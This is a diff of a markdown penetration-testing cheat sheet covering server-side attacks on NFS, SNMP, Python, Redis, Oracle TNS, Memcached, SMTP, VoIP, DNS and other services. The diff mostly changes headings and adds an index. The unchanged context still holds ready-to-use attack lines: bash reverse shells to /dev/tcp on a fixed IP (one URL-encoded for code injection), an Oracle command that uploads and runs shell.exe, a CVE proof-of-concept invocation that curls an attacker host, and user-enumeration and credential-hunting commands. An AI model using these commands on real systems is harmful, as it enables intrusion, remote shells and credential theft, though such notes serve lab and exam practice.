@@ -1,6 +1,23 @@
-## Server-Side attacks
+# Server-Side attacks
 
-### <ins>NFS</ins>
+## Index
+
+- [NFS](#nfs)
+- [IKE - Internet Key Exchange](#ike---internet-key-exchange)
+- [SNMP](#snmp)
+- [NodeJS](#nodejs)
+- [Python](#python)
+- [Redis 6379](#redis-6379)
+- [Oracle TNS](#oracle-tns)
+- [Memcached](#memcached)
+- [SMTP / IMAP](#smtp--imap)
+- [113 ident](#113-ident)
+- [FreeSWITCH](#freeswitch)
+- [Umbraco](#umbraco)
+- [VoIP penetration test](#voip-penetration-test)
+- [DNS](#dns)
+
+## NFS
 
 - > "Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user."
 - Ports: 2049, 111
@@ -37,7 +54,7 @@
 - Check: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
 
 
-### <ins>IKE - Internet Key Exchange</ins>
+## IKE - Internet Key Exchange
 
 - common port: `500/udp-tcp`
   - nmap sometimes says `isakmp?`
@@ -47,7 +64,7 @@
   - port `161/udp-tcp`
 
 
-### <ins>SNMP</ins>
+## SNMP
 
 - if you see this, maybe with IKE, can mean that this service is used to block any interaction from external hosts
   - if you can configure it, you can bypass this kind of proxy and rerun nmap
@@ -63,14 +80,14 @@ If you have found a password
 - When you run again nmap, use `-sT`
 
 
-### <ins>NodeJS</ins>
+## NodeJS
 
 - Reverse shell: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs
 - If you find JS injection, you find RCE. Try this payload: `(function(){return 2+2;})();`
   - if the result is `4`, then it is a good sign
 
 
-### <ins>Python</ins>
+## Python
 
 - https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
 - check if there is the library 'os', you can achieve RCE with `system('bash -i >& /dev/tcp/192.168.45.221/445 0>&1')`
@@ -80,7 +97,7 @@ If you have found a password
   - `code=__import__('os').system('bash+-i+>%26+/dev/tcp/192.168.49.195/445+0>%261')%2`
 
 
-### <ins>Redis 6379</ins>
+## Redis 6379
 
 - `nmap --script redis-info -sV -p 6379 IP`
 - `redis-cli -h IP`
@@ -109,7 +126,7 @@ If you have found a password
 
 
 
-### <ins>Oracle TNS</ins>
+## Oracle TNS
 
 - HackTricks: https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
 - Common ports: `1521`, `1748`
@@ -137,7 +154,7 @@ If you have found a password
 - `python3 odat.py externaltable -s IP -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe`
 
 
-### <ins>Memcached</ins>
+## Memcached
 
 - `telnet IP 11211`
 - `msf > use auxiliary/gather/memcached_extractor`
@@ -147,7 +164,7 @@ If you have found a password
   - `python cve-2021-33026_PoC.py --rhost IP --rport 5000 --cmd "curl http://ATTACKERIP" --cookie "session:de43fcb3-d960-4851-b14a-f7da3993e33d"`
 
 
-### <ins>SMTP / IMAP</ins>
+## SMTP / IMAP
 
 - `sudo perl ~/Documents/scripts/smtp/smtp-user-enum.pl -M VRFY -U /home/kali/Documents/lists/common_list/usernames.txt -t IP`
 - Connect to imap
@@ -182,7 +199,7 @@ If you have found a password
 
 
 
-### <ins>113 ident</ins>
+## 113 ident
 
 - `nc -vn IP 113`
 - `ident-user-enum IP 113`
@@ -192,12 +209,12 @@ If you have found a password
 
 
 
-### <ins>FreeSWITCH</ins>
+## FreeSWITCH
 
 - Discover password: `/etc/freeswitch/autoload_configs/event_socket.conf.xml`
 
 
-### <ins>Umbraco</ins>
+## Umbraco
 
 - Umbraco Database Connection Credentials: `strings App_Data/Umbraco.sdf | grep admin`
   - See these resources:
@@ -205,7 +222,7 @@ If you have found a password
     - https://app.hackthebox.com/machines/234
 
 
-### <ins>VoIP penetration test</ins>
+## VoIP penetration test
 
 - `python3 sipdigestleak.py -i IP`
   - Find credentials
@@ -213,7 +230,7 @@ If you have found a password
   - decrypt raw voip data
 
 
-### <ins>DNS</ins>
+## DNS
 
 **DNS zone transfer**
 - `dig axfr @<DNS_IP>`
